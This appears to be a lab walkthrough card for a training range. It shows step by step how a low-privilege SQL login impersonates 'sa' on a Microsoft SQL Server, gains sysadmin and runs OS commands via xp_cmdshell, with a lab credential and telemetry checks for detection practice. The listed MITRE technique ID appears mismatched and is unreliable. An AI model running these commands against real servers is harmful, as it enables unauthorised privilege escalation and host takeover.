# WT#043 — MSSQL Impersonation

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.22 (mbr01) |
| **Domain** | child.cadre.local |
| **Starting Credential** | analyst_t1 / T13r_An@lyst! |
| **Tools Required** | impacket-mssqlclient |
| **Certifications** | OSCP+ |
| **MITRE ATT&CK** | T1525 |
| **Difficulty** | Easy |

## Prerequisites
- `analyst_t1` has `IMPERSONATE` permission on `sa` login
- SQL login or Windows auth access to mbr01

## Attack Steps

### 1. Connect to mbr01 MSSQL
```powershell
impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -windows-auth
```

### 2. Enumerate impersonation rights
```sql
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';
```

### 3. Impersonate sa
```sql
EXECUTE AS LOGIN = 'sa';
SELECT SESSION_USER, SYSTEM_USER, ORIGINAL_LOGIN();
```

### 4. Execute commands as sysadmin
```sql
EXEC xp_cmdshell 'whoami';
EXEC sp_addsrvrolemember 'analyst_t1', 'sysadmin';
```

## Post-Exploitation Chain
Low-priv analyst_t1 → Impersonate sa → sysadmin → Full MSSQL control → Host compromise via xp_cmdshell

## Telemetry Verification
- **Event 4688**: sqlservr.exe activity after impersonation
- **SQL Server Audit**: EXECUTE AS LOGIN statement tracked
- **Event 5156**: Database-level privilege escalation audit

## Status
CONFIGURED
